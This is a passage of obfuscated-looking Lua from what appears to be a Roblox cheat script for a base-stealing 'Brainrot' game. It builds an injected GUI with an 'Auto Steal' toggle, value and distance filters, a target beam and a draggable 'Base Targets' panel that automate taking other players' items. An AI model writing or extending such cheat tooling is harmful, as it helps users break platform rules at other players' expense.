								while flag2 and flag3 and arg == n5 and localPlayer:GetAttribute("Stealing") == true do
									if str2 and string.find(str2, "v19") then
										task.wait()
									else
										task.wait(0.05)
									end
								end

								if not (str2 and string.find(str2, "v19")) then
									fn32(arg)
								end

								flag7 = false

								if str2 and string.find(str2, "v19") then
									flag9 = true
								end
							else
								if not (str2 and string.find(str2, "v20")) then
									fn16(nil)
								end

								flag7 = false
								local character_ = localPlayer.Character
								character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

								if not character_ then
									fn20()
								else
									local v14, v15, v16

									if flag4 then
										v14, v15, v16 = fn18(character_)
									else
										v14, v15 = fn17(character_)
										v16 = nil
									end

									local v17 = fn12(character_, v14, v15, v16)
									fn15(v17)

									if not v17 then
										fn20()
									else
										prompt = v17.Prompt

										if not fn30(v17, arg, function()
											return fn31(v17, arg, false)
										end, fn21, false) then
											fn20()
										end
									end
								end
							end

							continue
						end
					end

					break
				end
			end

			fn13 = function()
				n5 += 1
				flag3 = true
				flag7 = false
				n7 = -math.huge
				fn26()
				task.spawn(fn33, n5)
			end
		end

		fn14 = function()
			flag3 = false
			flag7 = false
			n5 += 1
			fn20()
			fn16(nil)
			fn26()
		end

		local n12 = 0

		fn4(localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			if localPlayer:GetAttribute("Stealing") == true then
				n6 = os.clock()
				n12 += 1
				local v14 = n12

				task.spawn(function()
					task.wait(1.5)

					if flag3 and localPlayer:GetAttribute("Stealing") == true and n12 == v14 then
						fn14()
						task.wait(0.05)
						fn13()
					end
				end)
			else
				n12 += 1

				if not (os.clock() - n4 < 0.5) then
					local flag9 = false

					if RagdollController then
						local ok, result = pcall(function()
							return RagdollController.IsInRagdoll()
						end)

						if ok and result == true then
							flag9 = true
						end
					end

					if not flag9 then
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChildOfClass("Humanoid")

						if character_ then
							local state = character_:GetState()

							if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.Ragdoll then
								flag9 = true
							end
						end
					end

					local flag10

					if not flag9 then
						local character_ = localPlayer.Character

						if character_ and character_:FindFirstChildOfClass("BallSocketConstraint", true) then
							flag10 = true
						else
							flag10 = flag9
						end
					else
						flag10 = flag9
					end

					if flag10 then
						flag6 = true
					end
				end
			end
		end))

		fn4(Workspace.ChildAdded:Connect(function(child)
			if child.Name == "Plots" then
				n7 = -math.huge
			end
		end))

		local plots = Workspace:FindFirstChild("Plots")

		if plots then
			fn4(plots.ChildAdded:Connect(function()
				n7 = -math.huge
			end))

			fn4(plots.ChildRemoved:Connect(function()
				n7 = -math.huge
			end))
		end

		local v14

		v14 = v12:CreateToggle({
			Name = "Auto Steal",
			Default = true,
			Callback = function(arg)
				str2 = "Auto Get Default"

				if arg then
					fn13()
				else
					fn14()
				end
			end,
		})

		local fn27

		fn27 = function()
			if v14 and v14.Get and v14:Get() ~= true then
				v14:Set(true, true)
			end
		end

		v12:CreateToggle({
			Name = "Steal Best Brainrot Only",
			Default = false,
			Quick = false,
			SubOf = v14,
			Callback = function(arg)
				flag4 = arg == true
			end,
		})

		do
			local tbl4 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
			}

			local createSlider = nil
			local n13 = 1
			local str3 = "M/s"

			local function fn28(arg, arg2)
				if arg ~= nil then
					n13 = math.floor(tonumber(arg) or n13)
				end

				if arg2 ~= nil then
					str3 = tostring(arg2)
				elseif createSlider and createSlider.GetUnit then
					local unit = createSlider:GetUnit()

					if unit and unit ~= "" then
						str3 = tostring(unit)
					end
				end

				n2 = n13 * (tbl4[str3] or tbl4["M/s"]).Mult
				n7 = -math.huge
			end

			local function fn29(arg)
				str3 = arg
				local ms = tbl4[arg] or tbl4["M/s"]

				if createSlider and createSlider.SetRange then
					createSlider:SetRange(ms.Min, ms.Max)
					local min = createSlider:Get() or ms.Min
					local min2 = ms.Min
					local max = ms.Max
					local n14 = math.clamp(math.floor(min + 0.5), min2, max)

					if n14 ~= min then
						createSlider:Set(n14)
					else
						fn28(n14, arg)
					end
				else
					fn28(nil, arg)
				end
			end

			createSlider = v12.CreateSlider

			createSlider = createSlider(v12, {
				Name = "Auto Steal Min Value",
				Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
				Min = 0,
				Max = 1000,
				Default = 0,
				AllowDecimals = false,
				Increment = 1,
				Unit = {
					Default = "M/s",
					Selector = true,
					Options = { "K/s", "M/s", "B/s" },
					ColorEnabled = true,
					Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
					Callback = function(arg)
						fn29(arg)
					end,
				},
				Quick = false,
				SubOf = v14,
				Callback = function(arg)
					fn28(arg, nil)
				end,
			})
		end

		v12:CreateSlider({
			Name = "Auto Steal Distance",
			Min = 10,
			Max = 200,
			Default = 58,
			AllowDecimals = false,
			Increment = 1,
			Unit = " studs",
			Quick = false,
			SubOf = v14,
			Callback = function(arg)
				n3 = math.clamp(tonumber(arg) or 20, 10, 200)
			end,
		})

		local fn28

		do
			local color = Color3.fromRGB(170, 255, 0)
			local color2 = Color3.fromRGB(240, 255, 210)
			local flag9 = false
			local attachment = nil
			local attachment2 = nil
			local beam = nil
			local v15 = nil
			local v16 = nil
			local n13 = -math.huge

			fn28 = function()
				pcall(function()
					if beam then
						beam:Destroy()
					end
				end)

				pcall(function()
					if attachment then
						attachment:Destroy()
					end
				end)

				pcall(function()
					if attachment2 then
						attachment2:Destroy()
					end
				end)

				beam = nil
				attachment = nil
				attachment2 = nil
				v15 = nil
				v16 = nil
			end

			local function fn29()
				local v17 = Workspace:FindFirstChild(localPlayer.Name)
				if not v17 or not v17:IsA("Model") then
					return nil
				end
				local humanoidRootPart = v17:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart.Parent == v17 then
					return humanoidRootPart
				end
				local hitbox = v17:FindFirstChild("__HITBOX") or v17:FindFirstChild("__hitbox") or v17:FindFirstChild("Hitbox") or v17:FindFirstChild("HitBox")
				if hitbox and hitbox:IsA("BasePart") then
					return hitbox
				end
				return nil
			end

			local function fn30(parent, parent2)
				fn28()
				if not (parent and parent2) then
					return
				end
				attachment = Instance.new("Attachment")
				attachment.Name = fn()
				attachment.Position = Vector3.new(0, 0.6, 0)
				attachment.Parent = parent
				attachment2 = Instance.new("Attachment")
				attachment2.Name = fn()
				attachment2.Position = Vector3.new(0, 2.6, 0)
				attachment2.Parent = parent2
				beam = Instance.new("Beam")
				beam.Name = fn()
				beam.Archivable = false
				beam.Attachment0 = attachment
				beam.Attachment1 = attachment2
				beam.Color = ColorSequence.new(color, color2)
				beam.CurveSize0 = 0
				beam.CurveSize1 = 0
				beam.FaceCamera = true
				beam.LightEmission = 1
				beam.Segments = 4
				beam.Texture = "rbxassetid://446111271"
				beam.TextureLength = 3
				beam.TextureMode = Enum.TextureMode.Wrap
				beam.TextureSpeed = 3
				local v17 = beam
				local numberSequence = NumberSequence.new
				local tbl4 = {}
				local v18 = NumberSequenceKeypoint.new(0, 0)
				local v19 = NumberSequenceKeypoint.new(0.85, 0)
				tbl4[1] = v18
				tbl4[2] = v19

				do
					local values = table.pack(NumberSequenceKeypoint.new(1, 0.25))
					table.move(values, 1, values.n, 3, tbl4)
				end

				v17.Transparency = numberSequence(tbl4)
				beam.Width0 = 0.34
				beam.Width1 = 0.7
				beam.ZOffset = 0.1
				obj[beam] = true
				beam.Parent = attachment
				v15 = parent
				v16 = parent2
			end

			local function fn31()
				if not (flag9 and flag3) then
					if beam then
						fn28()
					end

					return
				end

				local now = os.clock()
				if now - n13 < 0.1 then
					return
				end
				n13 = now
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				local v17 = fn29(character_)
				if not (humanoidRootPart and v17) then
					fn28()
					return
				end
				local v18, v19, v20 = fn18(humanoidRootPart)
				local v21 = fn12(humanoidRootPart, v18, v19, v20)
				local spawn = v21 and fn10(v21.Prompt) or nil
				spawn = spawn and spawn.Spawn or nil
				if not spawn then
					fn28()
					return
				end
				local flag10 = v15 ~= v17 or v16 ~= spawn

				if not flag10 then
					flag10 = not (attachment and attachment.Parent)
				end

				if flag10 then
					fn30(v17, spawn)
				end
			end

			fn4(RunService.Heartbeat:Connect(function()
				if flag2 then
					fn31()
				end
			end))

			v12:CreateToggle({
				Name = "Target Beam",
				Note = "Draws a straight amber line to the Brainrot Auto Steal is targeting.",
				Default = true,
				Quick = false,
				SubOf = v14,
				Callback = function(arg)
					flag9 = arg == true

					if not flag9 then
						fn28()
					end
				end,
			})
		end

		local n13
		n13 = 140
		local n14
		n14 = 5
		local n15
		n15 = 0.5
		local color
		color = Color3.fromRGB(58, 255, 55)
		local n16
		n16 = 214
		local n17
		n17 = 40
		local n18
		n18 = 44
		local screenGui3
		screenGui3 = nil
		local v15
		v15 = nil
		local v16
		v16 = nil
		local tbl4
		tbl4 = {}
		local v17
		v17 = nil
		local v18
		v18 = nil
		local flag9, n19, n20, v19, flag10, n21, str3, fn29

		do
			local v20 = nil
			local v21 = nil
			local v22 = nil
			flag9 = false
			n19 = 5
			n20 = 1
			v19 = nil
			flag10 = false
			n21 = -math.huge
			local v23 = nil
			local n22 = -math.huge
			str3 = ""
			local gothamBold = Enum.Font.GothamBold

			pcall(function()
				gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			end)

			local function fn30(arg)
				if typeof(gothamBold) == "Font" then
					arg.FontFace = gothamBold
				else
					arg.Font = Enum.Font.GothamBold
				end
			end

			local v24 = v2:CreateState({
				Name = "Base Target Panel Position",
				Default = {
					XOffset = 0,
					XScale = 0.78183454275131226,
					YScale = 0.022769367322325706,
					YOffset = 0,
				},
			})

			local function fn31()
				local v25 = v24:Get()
				if type(v25) == "table" and type(v25.XOffset) == "number" and type(v25.YOffset) == "number" then
					return UDim2.new(tonumber(v25.XScale) or 1, v25.XOffset, tonumber(v25.YScale) or 0.5, v25.YOffset)
				end
				return UDim2.new(1, -18, 0.5, 0)
			end

			local function fn32(arg)
				v24:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
			end

			local tweenInfo = TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
			local n23 = 0
			local v25 = nil

			local function fn33()
				if not v15 then
					return
				end
				local visible2 = n23 == 0 and not flag9

				if v20 then
					v20.Visible = visible2
					v20.Text = v25 and "no brainrot left in this base" or "no base nearby"
				end

				local n24 = flag9 and 0 or n23
				local n25

				if n24 > 0 then
					n25 = (n17 + 4) * n24 + 4
				else
					n25 = 0

					if visible2 then
						n25 = 26
					end
				end

				local n26 = n18 + n25
				if v21 == n26 then
					return
				end
				v21 = n26

				if v18 then
					if n25 > 0 then
						v18.Visible = true
					end

					TweenService:Create(v18, tweenInfo, { Size = UDim2.new(1, -20, 0, math.max(n25, 1)) }):Play()
				end

				local tween = TweenService:Create(v15, tweenInfo, { Size = UDim2.fromOffset(214, n26) })

				if n25 <= 0 and v18 then
					tween.Completed:Connect(function()
						if v18 and v21 == n26 then
							v18.Visible = false
						end
					end)
				end

				tween:Play()
			end

			fn29 = function()
				table.clear(tbl4)
				v15 = nil
				v16 = nil
				v17 = nil
				v18 = nil
				v20 = nil
				v21 = nil
				v22 = nil
				v19 = nil
				str3 = ""

				if screenGui3 then
					pcall(function()
						screenGui3:Destroy()
					end)

					screenGui3 = nil
				end
			end

			local function fn34(arg, arg2)
				local debris = Workspace:FindFirstChild("Debris")
				if not debris or arg2 == "" then
					return nil
				end
				local v26 = nil
				local v27 = nil

				for _, child in ipairs(debris:GetChildren()) do
					if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
						local animalOverhead = child:FindFirstChild("AnimalOverhead")
						local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

						if displayName and displayName:IsA("TextLabel") and displayName.Text == arg2 then
							local magnitude = (child.Position - arg.Position).Magnitude

							if not v26 or magnitude < v26 then
								v26 = magnitude
								v27 = animalOverhead
							end
						end
					end
				end

				if v27 and v26 and v26 <= 14 then
					return v27
				end
				return nil
			end

			local function fn35(arg, arg2, arg3)
				if not (arg and arg2) or arg3 == "" then
					return nil
				end
				local v26 = nil
				local v27 = nil

				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("Model") and child.Name == arg3 then
						local ok, result = pcall(function()
							return child:GetPivot()
						end)

						if ok then
							local magnitude = (result.Position - arg2.Position).Magnitude

							if not v26 or magnitude < v26 then
								v27 = child
								v26 = magnitude
							end
						end
					end
				end

				if v27 and v26 and v26 <= 14 then
					return v27
				end
				return nil
			end

			local str4 = ""

			local function fn36(arg, painted)
				if arg.Painted == painted then
					return
				end
				arg.Painted = painted
				local v26 = ipairs
				local tweens = arg.Tweens or {}

				for _, tween in v26(tweens) do
					pcall(function()
						tween:Cancel()
					end)
				end

				local tweens2 = {}
				local tween = TweenService:Create(arg.Accent, tweenInfo, { Size = UDim2.new(0, painted and 3 or 0, 1, -12) })
				local tween2 = TweenService:Create(arg.Stroke, tweenInfo, { Color = painted and color or Color3.fromRGB(255, 255, 255), Transparency = painted and 0.1 or 0.86 })
				local v27 = TweenService
				local create = v27.Create
				local row = arg.Row
				local tbl5 = { BackgroundTransparency = painted and 0.12 or 0.4 }
				local v28 = table.pack(create(v27, row, tweenInfo, tbl5))
				tweens2[1] = tween
				tweens2[2] = tween2

				do
					local values = table.pack(table.unpack(v28, 1, v28.n))
					table.move(values, 1, values.n, 3, tweens2)
				end

				arg.Tweens = tweens2

				for _, tween3 in ipairs(arg.Tweens) do
					tween3:Play()
				end
			end

			local function fn37()
				for _, v26 in ipairs(tbl4) do
					fn36(v26, prompt2 ~= nil and v26.Prompt == prompt2)
				end
			end

			local function fn38(layoutOrder)
				local textButton = Instance.new("TextButton")
				textButton.AutoButtonColor = false
				textButton.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
				textButton.BackgroundTransparency = 0.3
				textButton.BorderSizePixel = 0
				textButton.LayoutOrder = layoutOrder
				textButton.Size = UDim2.new(1, 0, 0, 40)
				textButton.Text = ""
				textButton.Parent = v16
				Instance.new("UICorner", textButton).CornerRadius = UDim.new(0, 9)
				local frame4 = Instance.new("Frame")
				frame4.AnchorPoint = Vector2.new(0, 0.5)
				frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame4.BorderSizePixel = 0
				frame4.Position = UDim2.new(0, 0, 0.5, 0)
				frame4.Size = UDim2.new(0, 0, 1, -12)
				frame4.ZIndex = 4
				frame4.Parent = textButton
				Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
				local uiGradient = Instance.new("UIGradient")
				local new = ColorSequenceKeypoint.new
				local color2 = Color3.fromRGB
				uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(58, 255, 55)), new(1, color2(20, 109, 0)) })
				uiGradient.Rotation = 90
				uiGradient.Parent = frame4
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Thickness = 1.3
				uiStroke.Parent = textButton
				local viewportFrame = Instance.new("ViewportFrame")
				viewportFrame.Ambient = Color3.fromRGB(190, 190, 200)
				viewportFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
				viewportFrame.BackgroundTransparency = 0.25
				viewportFrame.BorderSizePixel = 0
				viewportFrame.LightColor = Color3.fromRGB(255, 255, 255)
				viewportFrame.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
				viewportFrame.Position = UDim2.fromOffset(4, 3)
				viewportFrame.Size = UDim2.fromOffset(n17 - 6, n17 - 6)
				viewportFrame.Parent = textButton
				Instance.new("UICorner", viewportFrame).CornerRadius = UDim.new(0, 8)
				local camera = Instance.new("Camera")
				camera.Parent = viewportFrame
				viewportFrame.CurrentCamera = camera
				local frame5 = Instance.new("Frame")
				frame5.AnchorPoint = Vector2.new(1, 1)
				frame5.BackgroundColor3 = Color3.fromRGB(10, 10, 13)
				frame5.BackgroundTransparency = 0.15
				frame5.BorderSizePixel = 0
				frame5.Position = UDim2.fromOffset(n17 - 3, n17 - 3)
				frame5.Size = UDim2.fromOffset(24, 13)
				frame5.ZIndex = 4
				frame5.Parent = textButton
				Instance.new("UICorner", frame5).CornerRadius = UDim.new(0, 5)
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Size = UDim2.fromScale(1, 1)
				textLabel3.Text = ""
				textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel3.TextScaled = true
				textLabel3.ZIndex = 5
				fn30(textLabel3)
				textLabel3.Parent = frame5
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Color = Color3.fromRGB(0, 0, 0)
				uiStroke2.Thickness = 1.4
				uiStroke2.Transparency = 0.25
				uiStroke2.Parent = textLabel3
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(n17 + 2, 5)
				textLabel4.Size = UDim2.new(1, -n17 - 10, 0, 13)
				textLabel4.Text = ""
				textLabel4.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel4.TextScaled = true
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				fn30(textLabel4)
				textLabel4.Parent = textButton
				local v26 = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel4)
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.BackgroundTransparency = 1
				textLabel5.Position = UDim2.fromOffset(n17 + 2, 20)
				textLabel5.Size = UDim2.fromOffset(62, 11)
				textLabel5.Text = ""
				textLabel5.TextColor3 = Color3.fromRGB(115, 255, 0)
				textLabel5.TextScaled = true
				textLabel5.TextXAlignment = Enum.TextXAlignment.Left
				fn30(textLabel5)
				textLabel5.Parent = textButton
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.BackgroundTransparency = 1
				textLabel6.Position = UDim2.fromOffset(n17 + 66, 20)
				textLabel6.RichText = true
				textLabel6.Size = UDim2.fromOffset(62, 11)
				textLabel6.Text = ""
				textLabel6.TextScaled = true
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left
				fn30(textLabel6)
				textLabel6.Parent = textButton
				local frame6 = Instance.new("Frame")
				frame6.AnchorPoint = Vector2.new(1, 0)
				frame6.BackgroundTransparency = 1
				frame6.Position = UDim2.new(1, -7, 0, 19)
				frame6.Size = UDim2.fromOffset(44, 12)
				frame6.Parent = textButton
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Horizontal
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.Padding = UDim.new(0, 2)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
				uiListLayout.Parent = frame6

				local tbl5 = {
					Row = textButton,
					Accent = frame4,
					Stroke = uiStroke,
					Viewport = viewportFrame,
					Camera = camera,
					Rank = textLabel3,
					NameLabel = textLabel4,
					NameStyle = v26,
					ValueLabel = textLabel5,
					MutationLabel = textLabel6,
					TraitHolder = frame6,
					Prompt = nil,
					RowKey = nil,
					ModelKey = nil,
					Clone = nil,
					Track = nil,
					SourceTrack = nil,
					Painted = nil,
					Tweens = nil,
				}

				fn5(textButton, function()
					if not tbl5.Prompt then
						return
					end

					if prompt2 == tbl5.Prompt then
						prompt2 = nil
						str4 = ""
					else
						prompt2 = tbl5.Prompt
						str4 = tbl5.NameLabel.Text
						fn27()
					end

					str3 = ""
					fn37()
				end)

				return tbl5
			end

			local function fn39()
				if screenGui3 and screenGui3.Parent then
					return
				end
				screenGui3 = Instance.new("ScreenGui")
				screenGui3.Name = "ChilliAutoGetTargetPanel"
				screenGui3.DisplayOrder = 5
				screenGui3.IgnoreGuiInset = true
				screenGui3.ResetOnSpawn = false
				screenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				local parent = CoreGui

				if type(gethui) == "function" then
					local ok
					ok, parent = pcall(gethui)
					ok = ok and typeof(parent) == "Instance"
					local v26 = CoreGui

					if not ok then
						parent = v26
					end
				end

				screenGui3.Parent = parent
				local frame4 = Instance.new("Frame")
				frame4.Active = true
				frame4.AnchorPoint = Vector2.new(1, 0)
				frame4.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
				frame4.BackgroundTransparency = 0.18
				frame4.BorderSizePixel = 0
				frame4.Position = fn31()
				frame4.Size = UDim2.fromOffset(214, 44)
				frame4.ClipsDescendants = true
				frame4.Parent = screenGui3
				Instance.new("UICorner", frame4).CornerRadius = UDim.new(0, 14)
				v15 = frame4
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.9
				uiStroke.Parent = frame4
				local uiScale = Instance.new("UIScale")
				uiScale.Parent = frame4

				local function fn40()
					local currentCamera = Workspace.CurrentCamera
					local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

					if viewportSize.X < 1 then
						viewportSize = Vector2.new(1280, 720)
					end

					uiScale.Scale = math.clamp(viewportSize.X * 0.15 / n16, 0.7, 1.3) * n20
				end

				v19 = fn40
				fn40()
				local currentCamera = Workspace.CurrentCamera

				if currentCamera then
					fn4(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn40))
				end

				local textButton = Instance.new("TextButton")
				textButton.Name = "Handle"
				textButton.Active = true
				textButton.AutoButtonColor = false
				textButton.BackgroundTransparency = 1
				textButton.BorderSizePixel = 0
				textButton.Position = UDim2.fromOffset(0, 0)
				textButton.Size = UDim2.new(1, 0, 0, 44)
				textButton.Text = ""
				textButton.ZIndex = 2
				textButton.Parent = frame4
				local fn41 = nil
				local flag11 = false
				local flag12 = nil
				local flag13 = false
				local vector2 = Vector2.new(0, 0)
				local vector22 = Vector2.new(0, 0)

				textButton.InputBegan:Connect(function(input)
					if flag11 or input.UserInputState ~= Enum.UserInputState.Begin then
						return
					end

					if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
						return
					end
					local vector23 = Vector2.new(input.Position.X, input.Position.Y)
					local absolutePosition = textButton.AbsolutePosition
					local absoluteSize = textButton.AbsoluteSize
					if vector23.X < absolutePosition.X or vector23.X > absolutePosition.X + absoluteSize.X or vector23.Y < absolutePosition.Y or vector23.Y > absolutePosition.Y + absoluteSize.Y then
						return
					end

					for _, child in ipairs(textButton:GetChildren()) do
						if child:IsA("GuiButton") and child.Visible then
							local absolutePosition2 = child.AbsolutePosition
							local absoluteSize2 = child.AbsoluteSize
							if vector23.X >= absolutePosition2.X and vector23.X <= absolutePosition2.X + absoluteSize2.X and vector23.Y >= absolutePosition2.Y and vector23.Y <= absolutePosition2.Y + absoluteSize2.Y then
								return
							end
						end
					end

					local absoluteSize2 = screenGui3.AbsoluteSize
					if absoluteSize2.X <= 0 or absoluteSize2.Y <= 0 then
						return
					end
					flag11 = true
					flag13 = false
					flag12 = input.UserInputType == Enum.UserInputType.Touch and input or nil
					vector2 = Vector2.new(input.Position.X, input.Position.Y)
					vector22 = Vector2.new(frame4.Position.X.Scale + frame4.Position.X.Offset / absoluteSize2.X, frame4.Position.Y.Scale + frame4.Position.Y.Offset / absoluteSize2.Y)
				end)

				fn4(UserInputService2.InputChanged:Connect(function(input)
					if not flag11 then
						return
					end

					if not (flag12 and input == flag12 or not flag12 and input.UserInputType == Enum.UserInputType.MouseMovement) or not v15 then
						return
					end
					local absoluteSize = screenGui3.AbsoluteSize
					if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
						return
					end
					local n24 = Vector2.new(input.Position.X, input.Position.Y) - vector2
					if not flag13 and n24.Magnitude < 6 then
						return
					end
					flag13 = true
					frame4.Position = UDim2.fromScale(math.clamp(vector22.X + n24.X / absoluteSize.X, math.min(math.max(frame4.AbsoluteSize.X / absoluteSize.X, 0), 0.998), 0.998), math.clamp(vector22.Y + n24.Y / absoluteSize.Y, 0, 0.98))
				end))

				fn4(UserInputService2.InputEnded:Connect(function(input)
					if not flag11 then
						return
					end

					if input.UserInputType == Enum.UserInputType.MouseButton1 or input == flag12 then
						flag11 = false
						flag12 = nil

						if flag13 then
							fn32(frame4.Position)
						elseif fn41 then
							fn41()
						end
					end
				end))

				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Position = UDim2.fromOffset(32, 8)
				textLabel3.Size = UDim2.fromOffset(n16 - 102, 14)
				textLabel3.Text = "Base Targets"
				textLabel3.TextColor3 = Color3.fromRGB(240, 240, 244)
				textLabel3.TextScaled = true
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				fn30(textLabel3)
				textLabel3.Parent = textButton
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(32, 23)
				textLabel4.Size = UDim2.fromOffset(n16 - 102, 10)
				textLabel4.Text = "walk into a base"
				textLabel4.TextColor3 = Color3.fromRGB(140, 140, 150)
				textLabel4.TextScaled = true
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				fn30(textLabel4)
				textLabel4.Parent = textButton
				v17 = textLabel4
				local textButton2 = Instance.new("TextButton")
				textButton2.AnchorPoint = Vector2.new(0, 0.5)
				textButton2.AutoButtonColor = false
				textButton2.BackgroundTransparency = 1
				textButton2.BorderSizePixel = 0
				textButton2.Position = UDim2.new(0, 8, 0, math.floor(n18 * 0.5))
				textButton2.Size = UDim2.fromOffset(20, 20)
				textButton2.Text = ""
				textButton2.ZIndex = 6
				textButton2.Parent = textButton
				local frame5 = Instance.new("Frame")
				frame5.AnchorPoint = Vector2.new(0.5, 0.5)
				frame5.BackgroundTransparency = 1
				frame5.BorderSizePixel = 0
				frame5.Position = UDim2.fromScale(0.5, 0.5)
				frame5.Size = UDim2.fromScale(0.62, 0.62)
				frame5.Parent = textButton2
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = frame5

				for _, v26 in ipairs({ { 0.335355, 45 }, { 0.664645, -45 } }) do
					local frame6 = Instance.new("Frame")
					frame6.AnchorPoint = Vector2.new(0.5, 0.5)
					frame6.BackgroundColor3 = Color3.fromRGB(58, 255, 55)
					frame6.BorderSizePixel = 0
					frame6.Position = UDim2.fromScale(v26[1], 0.535355)
					frame6.Rotation = v26[2]
					frame6.Size = UDim2.fromScale(0.6657, 0.2)
					frame6.Parent = frame5
				end

				v22 = frame5
				frame5.Rotation = flag9 and 180 or 0

				fn41 = function()
					flag9 = not flag9
					TweenService:Create(frame5, tweenInfo, { Rotation = flag9 and 180 or 0 }):Play()
					fn33()
				end

				fn5(textButton2, fn41)
				local textButton3 = Instance.new("TextButton")
				textButton3.AnchorPoint = Vector2.new(1, 0)
				textButton3.AutoButtonColor = false
				textButton3.BackgroundColor3 = Color3.fromRGB(34, 34, 40)
				textButton3.BackgroundTransparency = 0.2
				textButton3.BorderSizePixel = 0
				textButton3.Position = UDim2.new(1, -10, 0, 8)
				textButton3.Size = UDim2.fromOffset(58, 20)
				textButton3.Text = ""
				textButton3.Parent = textButton
				Instance.new("UICorner", textButton3).CornerRadius = UDim.new(1, 0)
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Color = Color3.fromRGB(255, 255, 255)
				uiStroke2.Thickness = 1.2
				uiStroke2.Transparency = 0.78
				uiStroke2.Parent = textButton3
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.BackgroundTransparency = 1
				textLabel5.Position = UDim2.fromOffset(9, 5)
				textLabel5.Size = UDim2.fromOffset(9, 10)
				textLabel5.Text = "X"
				textLabel5.TextColor3 = Color3.fromRGB(226, 226, 232)
				textLabel5.TextScaled = true
				fn30(textLabel5)
				textLabel5.Parent = textButton3
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.BackgroundTransparency = 1
				textLabel6.Position = UDim2.fromOffset(21, 5)
				textLabel6.Size = UDim2.fromOffset(30, 10)
				textLabel6.Text = "Clear"
				textLabel6.TextColor3 = Color3.fromRGB(226, 226, 232)
				textLabel6.TextScaled = true
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left
				fn30(textLabel6)
				textLabel6.Parent = textButton3

				local function fn42(arg)
					local color2 = arg and Color3.fromRGB(255, 150, 150) or Color3.fromRGB(226, 226, 232)
					TweenService:Create(textButton3, tweenInfo, { BackgroundTransparency = arg and 0.05 or 0.2 }):Play()

					TweenService:Create(uiStroke2, tweenInfo, {
						Color = arg and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(255, 255, 255),
						Transparency = arg and 0.25 or 0.78,
					}):Play()

					TweenService:Create(textLabel5, tweenInfo, { TextColor3 = color2 }):Play()
					TweenService:Create(textLabel6, tweenInfo, { TextColor3 = color2 }):Play()
				end

				textButton3.MouseEnter:Connect(function()
					fn42(true)
				end)

				textButton3.MouseLeave:Connect(function()
					fn42(false)
				end)

				fn5(textButton3, function()
					prompt2 = nil
					str4 = ""
					str3 = ""
					fn37()
				end)

				local frame6 = Instance.new("Frame")
				frame6.BackgroundTransparency = 1
				frame6.Position = UDim2.fromOffset(10, 40)
